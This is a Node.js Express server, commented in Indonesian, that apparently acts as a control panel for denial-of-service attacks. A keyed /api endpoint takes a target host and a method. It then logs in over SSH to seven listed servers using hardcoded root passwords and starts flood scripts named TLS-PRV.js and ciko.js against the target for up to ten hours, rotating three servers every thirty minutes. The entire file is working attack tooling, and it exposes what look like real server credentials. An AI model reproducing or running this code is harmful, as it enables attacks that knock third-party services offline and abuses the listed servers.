const express = require('express');
const { exec } = require('child_process');
const app = express();
const port = 54300;

// =======================
// Konfigurasi VPS
// =======================
const vpsList = [
    { host: '167.172.65.211', username: 'root', password: 'xzzy4akk9282' },
    { host: '157.230.38.170', username: 'root', password: 'xzzy4akk9282' },
    { host: '178.128.94.231', username: 'root', password: 'xzzy4akk9282' },
    { host: '104.248.159.1', username: 'root', password: 'xzzy4akk9282' },
    { host: '146.190.111.77', username: 'root', password: 'xzzy4akk9282' },
    { host: '165.232.170.188', username: 'root', password: 'xzzy4akk9282' },
    { host: '157.230.240.119', username: 'root', password: 'xzzy4akk9282' }
];

// =======================
// Metode & Script
// =======================
const scripts = {
    tls: 'TLS-PRV.js',
    ciko: 'ciko.js'
};

// =======================
// Variabel runtime
// =======================
let totalTime = 36000; // 10 jam dalam detik
let methodGlobal = '';
let hostGlobal = '';
let startTime = 0;
let isRunning = false;
let currentBatchStart = 0;

// =======================
// Fungsi Start Script di VPS
// =======================
function startVps(vps, method, time) {
    const scriptPath = scripts[method];
    const cmd = `sshpass -p '${vps.password}' ssh -o StrictHostKeyChecking=no ${vps.username}@${vps.host} "cd Cnc2 && nohup node ${scriptPath} ${hostGlobal} ${time} 10 10 proxy.txt > /dev/null 2>&1 &"`;
    exec(cmd, (err) => {
        if (err) {
            console.error(`[ERROR] Gagal start script di ${vps.host}: ${err.message}`);
        } else {
            console.log(`[START] VPS ${vps.host} menjalankan ${scriptPath} selama ${time} detik`);
        }
    });
}

// =======================
// Fungsi Kill Script di VPS
// =======================
function killVps(vps, method) {
    const scriptPath = scripts[method];
    const cmd = `sshpass -p '${vps.password}' ssh -o StrictHostKeyChecking=no ${vps.username}@${vps.host} "pkill -f ${scriptPath}"`;
    exec(cmd, (err) => {
        if (err) {
            console.error(`[ERROR] Gagal kill script di ${vps.host}: ${err.message}`);
        } else {
            console.log(`[STOP] VPS ${vps.host} dihentikan`);
        }
    });
}

// =======================
// Ambil batch VPS (3 VPS sekaligus)
// =======================
function getBatch(startIndex) {
    let batch = [];
    for (let i = 0; i < 3; i++) {
        batch.push(vpsList[(startIndex + i) % vpsList.length]);
    }
    return batch;
}

// =======================
// Rotasi batch 3 VPS
// =======================
function rotateBatch() {
    const oldBatch = getBatch(currentBatchStart);
    currentBatchStart = (currentBatchStart + 3) % vpsList.length;
    const newBatch = getBatch(currentBatchStart);

    // Start batch baru
    newBatch.forEach(vps => {
        startVps(vps, methodGlobal, totalTime - ((Date.now() - startTime) / 1000));
    });

    // Tunggu 30 detik lalu kill batch lama
    setTimeout(() => {
        oldBatch.forEach(vps => {
            killVps(vps, methodGlobal);
        });
    }, 30000);

    console.log(`[ROTATE] Batch baru: ${newBatch.map(v => v.host).join(', ')}`);
}

// =======================
// API Endpoint
// =======================
app.get('/api', (req, res) => {
    if (isRunning) {
        return res.status(429).json({ error: 'Attack already running' });
    }
    isRunning = true;

    const key = req.query.key;
    hostGlobal = req.query.host;
    methodGlobal = req.query.method;

    if (key !== 'iki') {
        isRunning = false;
        return res.status(401).json({ error: 'Invalid key' });
    }
    if (!scripts[methodGlobal]) {
        isRunning = false;
        return res.status(400).json({ error: 'Unknown method' });
    }

    totalTime = 36000;
    startTime = Date.now();
    currentBatchStart = 0;

    // Start batch pertama
    const firstBatch = getBatch(currentBatchStart);
    firstBatch.forEach(vps => {
        startVps(vps, methodGlobal, totalTime);
    });

    // Rotasi setiap 30 menit
    const rotationInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        if (elapsed >= totalTime) {
            console.log("[INFO] Waktu habis, hentikan semua VPS");
            getBatch(currentBatchStart).forEach(vps => killVps(vps, methodGlobal));
            clearInterval(rotationInterval);
            isRunning = false;
        } else {
            rotateBatch();
        }
    }, 30 * 60 * 1000);

    res.json({ message: 'Attack started with rotating 3-3 VPS system' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
